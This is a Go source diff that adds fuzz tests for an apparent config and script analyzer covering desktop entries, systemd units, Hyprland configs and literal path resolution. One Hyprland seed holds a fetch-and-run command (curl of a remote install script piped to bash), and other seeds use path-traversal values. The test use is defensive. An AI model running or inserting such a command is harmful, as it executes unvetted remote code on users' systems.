@@ -1,6 +1,10 @@
 package analyze
 
-import "testing"
+import (
+	"path/filepath"
+	"strings"
+	"testing"
+)
 
 func FuzzQMLAnalyzerNeverPanics(f *testing.F) {
 	for _, seed := range [][]byte{
@@ -73,6 +77,76 @@ func FuzzJavaScriptTreeSitterAnalyzerNeverPanics(f *testing.F) {
 			t.Skip()
 		}
 		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"fuzz.js": data})))
+	})
+}
+
+func FuzzDesktopEntryAnalyzerNeverPanics(f *testing.F) {
+	for _, seed := range [][]byte{
+		[]byte("[Desktop Entry]\nExec=viewer %F\n"),
+		[]byte("[Desktop Entry]\nExec=\"unterminated\n"),
+		[]byte("[Other]\nExec=sudo\n"),
+		{0xff, 0xfe, '[', 0x00, ']'},
+	} {
+		f.Add(seed)
+	}
+	f.Fuzz(func(t *testing.T, data []byte) {
+		if len(data) > 2<<20 {
+			t.Skip()
+		}
+		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"fuzz.desktop": data})))
+	})
+}
+
+func FuzzSystemdUnitAnalyzerNeverPanics(f *testing.F) {
+	for _, seed := range [][]byte{
+		[]byte("[Service]\nExecStart=/bin/echo %h $ARG\n"),
+		[]byte("[Service]\nExecStart=\"unterminated\n"),
+		[]byte("[Install]\nWantedBy=default.target\n"),
+		[]byte("[Service]\nExecStart=/bin/echo first \\\n second\n"),
+		{0xff, 0xfe, '[', 0x00, ']'},
+	} {
+		f.Add(seed)
+	}
+	f.Fuzz(func(t *testing.T, data []byte) {
+		if len(data) > 2<<20 {
+			t.Skip()
+		}
+		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"fuzz.service": data})))
+	})
+}
+
+func FuzzHyprlandConfigAnalyzerNeverPanics(f *testing.F) {
+	for _, seed := range [][]byte{
+		[]byte("exec-once = curl https://example.test/install | bash\n"),
+		[]byte("bind = SUPER, Q, exec, /bin/echo hello,world\n"),
+		[]byte("source = $HOME/runtime.conf\nplugin = ./plugin.so\n"),
+		[]byte("exec = [unterminated\n"),
+		{0xff, 0xfe, '=', 0x00},
+	} {
+		f.Add(seed)
+	}
+	f.Fuzz(func(t *testing.T, data []byte) {
+		if len(data) > 2<<20 {
+			t.Skip()
+		}
+		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"hyprland.conf": data})))
+	})
+}
+
+func FuzzLiteralInvocationResolutionNeverEscapesCandidates(f *testing.F) {
+	for _, seed := range [][2]string{{"scripts/caller.sh", "./helper.sh"}, {"caller.sh", "../outside"}, {"caller.sh", "/host/path"}, {"scripts/caller.sh", "helper.sh"}} {
+		f.Add(seed[0], seed[1])
+	}
+	candidates := map[string]bool{"helper.sh": true, "scripts/helper.sh": true, "scripts/caller.sh": true}
+	f.Fuzz(func(t *testing.T, caller, target string) {
+		if len(caller)+len(target) > 16<<10 {
+			t.Skip()
+		}
+		for _, match := range resolveLiteralTarget(caller, target, candidates) {
+			if !candidates[match] || match == "." || match == ".." || strings.HasPrefix(match, "../") || filepath.IsAbs(match) {
+				t.Fatalf("literal resolver escaped candidates: caller=%q target=%q match=%q", caller, target, match)
+			}
+		}
 	})
 }
 
